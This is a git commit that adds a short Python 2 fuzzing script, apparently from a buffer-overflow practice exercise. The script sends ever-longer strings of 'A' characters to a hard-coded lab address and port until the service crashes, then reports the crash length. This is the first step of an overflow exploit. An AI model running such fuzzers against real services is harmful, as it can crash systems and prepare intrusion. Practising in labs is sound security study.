290903eeaa4d1aa43663110f1944bbd616dd6674
Cyran Lemoncito <83115151+em1ga3l@users.noreply.github.com>
2022-02-05 20:27:07 +0800

    Create bof1_fuzzing.py

---
+++ python2/bof1_fuzzing.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python2
+
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+	try:
+		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('192.168.14.21',42424))
+		s.send((buffer + "\r\n"))
+		s.close()
+		sleep(1)
+		buffer = buffer + "A" * 100
+	except:
+		print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
+		sys.exit()
